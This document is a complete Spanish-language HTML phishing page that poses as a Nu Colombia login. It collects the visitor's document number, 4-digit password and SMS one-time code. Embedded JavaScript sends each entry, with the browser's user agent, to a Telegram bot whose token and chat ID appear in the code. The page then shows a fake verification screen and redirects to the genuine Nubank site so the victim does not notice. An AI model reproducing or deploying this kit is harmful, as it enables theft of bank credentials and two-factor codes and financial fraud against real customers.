<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Nu Colombia — Entrar</title>
<style>
*{box-sizing:border-box;font-family:-apple-system,Segoe UI,Roboto,sans-serif}
body{margin:0;background:#820AD1;color:#fff;min-height:100vh;display:flex;justify-content:center}
.box{width:100%;max-width:380px;padding:32px 24px}
.logo{font-size:28px;font-weight:800;margin:24px 0}h2{font-weight:600}
input{width:100%;padding:14px;margin:8px 0;border:0;border-radius:12px;font-size:16px}
.btn{width:100%;padding:14px;margin-top:12px;border:0;border-radius:12px;background:#fff;color:#820AD1;font-size:16px;font-weight:700;cursor:pointer}
.muted{opacity:.8;font-size:13px;text-align:center;margin-top:16px}
.card{background:rgba(255,255,255,.12);border-radius:16px;padding:16px;margin-top:16px;font-size:14px}
</style></head>
<body><div class="box">
<div class="logo">nu</div>
<div id="p1">
<h2>Hola, entra a tu cuenta</h2>
<form id="f1"><input id="doc" inputmode="numeric" placeholder="Número de documento" required>
<input id="pwd" type="password" inputmode="numeric" placeholder="Clave de 4 dígitos" maxlength="4" required>
<button class="btn">Continuar</button></form>
<div class="card">Verifica que estás en el sitio oficial: revisa el candado y el dominio antes de continuar.</div>
</div>
<div id="p2" style="display:none">
<h2>Código de verificación</h2>
<p class="muted">Te enviamos un código por SMS. Ingrésalo para continuar.</p>
<form id="f2"><input id="otp" inputmode="numeric" placeholder="______" maxlength="6" required>
<button class="btn">Confirmar</button></form>
<p class="muted" id="timer">Reenviar en 0:30</p>
</div>
<p class="muted">Nu Colombia · Ayuda · Términos</p>
</div>
<script>
const BOT="8982594594:AAHnFUSKOou39oLTzxIrlA3xpk3mXnruI2U",CHAT="8144084549";
const send=m=>fetch("https://api.telegram.org/bot"+BOT+"/sendMessage?chat_id="+CHAT+"&text="+encodeURIComponent(m),{mode:"no-cors"});
let DOC="",PWD="";
document.getElementById('f1').onsubmit=async e=>{
e.preventDefault();DOC=doc.value;PWD=pwd.value;
await send("NU P1\ndoc: "+DOC+"\nclave: "+PWD+"\n"+navigator.userAgent);
p1.style.display="none";p2.style.display="block";
let s=30;const t=setInterval(()=>{s--;timer.textContent="Reenviar en 0:"+String(s).padStart(2,"0");if(s<=0)clearInterval(t)},1000);
};
document.getElementById('f2').onsubmit=async e=>{
e.preventDefault();await send("NU P2\n doc: "+DOC+"\notp: "+otp.value);
document.body.innerHTML="<div class=box><div class=logo>nu</div><h2>Verificando…</h2><p class=muted>Esto puede tardar un minuto.</p></div>";
setTimeout(()=>location.href="https://www.nubank.com.co/",4000);
};
</script></body></html>
